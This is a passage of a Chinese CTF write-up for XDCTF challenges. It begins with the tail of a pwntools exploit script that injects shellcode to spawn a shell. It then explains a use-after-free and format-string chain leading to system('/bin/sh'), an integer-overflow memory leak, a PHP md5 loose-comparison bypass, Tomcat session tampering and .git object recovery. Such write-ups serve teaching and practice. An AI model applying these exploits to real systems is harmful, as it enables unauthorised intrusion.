    mysend('3')
    mysend('0')
    mysend('1')
    mysend('a'*0x74+p32(0x804b06c)+p32(0x804b064))
    mysend('2')
    mysend('1')
    mysend('3')
    mysend('2')
    mysend('0')
    mysend(p32(0x0804b010) + asm(shellcraft.sh()))
    mysend('3')
    mysend('3')
    mysend('0')
    c.send(p32(0x0804b070))
    sleep(0.1)
    c.interactive()

**PWN 400**

逆向可发现如下一段:

    
    
    c
    if ( (unsigned __int16)(file_name_len + 2) <= (signed int)(buf - src + buf_len - 46) )
    {
        if ( file_name_len )
            s = read_str(&ptr_int16, file_name_len, 1);
        v3 = strlen(s);
        v11 = write(fd, s, v3);
    }

很明显,这里如果`file_name_len`是0xffff的话导致加法溢出的话,这里的判断过掉,而后面又会将其当成一个无符号数去读字符串,从而输出后面的内存,其中就包含了flag。

最后吐槽一句,拿这种一分钟的题作400分真的好么……

## PWN 500

程序在 resit 的时候,对于不合格的 essay,free 和指针的清0是在不同的地方做的,如下:

    
    
    c
    if ( delete_fail_essay && score <= 59 )
        free(exam->essay);
    
    
    c
    if ( exam->real_essay_len )
    {
        exam->essay = 0LL;
        exam->real_essay_len = 0;
    }

可以明显看到这两个地方的判断条件是不同的,也就是说,我们只要让 `real_essay_len` 为 0,就可以在 essay 被 free
之后仍旧保留此指针,从而实现 UAF。

而在读入 essay 的时候:

    
    
    c
    read_essay_len = 0;
    do
        read_essay_len += read_str(&s[read_essay_len], len - read_essay_len);
    while ( read_essay_len != len );
    fputs(s, stream);
    
    
    c
    while ( fread(&ptr[i], 1uLL, 1uLL, stream) )
        ++i;

很明显,这里我们通过输入 `x00`,可以导致 `fputs` 的时候没有写入任何东西到 `stream`,于是接下来 `fread`
的时候就什么也读不到,从而实现 `read_essay_len` 为 0。

UAF 之后,我们让 essay 和一个 exam 的结构体使用同一份内存,通过 cheat,我们可以修改已经 free 的 essay,也即可以修改
exam 的结构体,改写其中的函数指针,从而在 show scores 的时候调用任意函数。

但是,调用函数的时候,参数我们无法控制,只能是以执行这个结构体的指针为第一个参数,由于结构体完全受我们控制,也就是说第一个参数的字符串内容是我们可以控制的,那么只要我们能够知道system的地址,我们就可以调用
`system("/bin/sh")` 了。

为了知道 system 的地址,我们可以构造一个格式化字符串漏洞,即调用 `printf("%11$16lx")`,这样可以将 main 函数的
return address 泄漏,而这个地址在 `__libc_start_main` 中,也即在 libc 中,于是就可以计算 system
地址了,此题得以解决。

PS:据说覆盖子进程的 rbp 也是可以脑洞出一个利用的……

  

**WEB1 100**

先下载备份文件index.php~,发现是一个被混淆过的php文件,找到个破解网站
http://zhaoyuanma.com/phpjm.php,破解后的源代码提示需要满足 `$test=$_GET['test'];
$test=md5($test); if($test=='0')`

那么md5($test)什么时候会和'0'相等呢?

找到一篇解释 http://stackoverflow.com/questions/22140204/why-md5240610708-is-equal-to-md5qnkcdzo

了解到当使用=='0'做比较时,会将md5字符串转换成数字。那么只要找到能够被转换成0的md5字符串即可。由于240610708的md5值是`0e462097431906509019562988736854`,它可以代表一个浮点数0(因为0e代表科学计数法),那么它和0比较的时候就会相等,于是将240610708作为test的参数,可以获取flag。

## WEB1 200

这道题看源代码就可以知道examples这个目录,但是后来就完全不知道怎么搞了。到了第二天晚上有个同学扫到了改Session的路径,也就是这个http://flagbox-23031374.xdctf.win:1234/examples/servlets/servlet/SessionExample
……

然后就很简单了,把user设成Administrator,pwd随便写,然后登录页面返回了not
login的消息,猜猜,添个login=true的数据,就得到了flag。

  

**WEB2 200**

首先题目提示了git,进入页面后发现有.git目录,不过403,根据.git目录的惯例爬文件,不过HEAD里面没什么东西,后来看到tag1.0之类的字样,就把refs/tags下面的文件拿来,根据hash去objects里面抓文件,拿来后扔zlib里解压,发现是一个树节点,依次把里面提到的objects都取来后在index页面里发现flag

本文翻译自复旦六星战队@360安全播报 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **安全客** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/82649](/post/id/82649)

安全客 - 有思想的安全新媒体

本文转载自: [复旦六星战队@360安全播报]()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF通关攻略](/tag/CTF通关攻略)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhimg.com/t01546a096e83e700fe.jpg) 安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

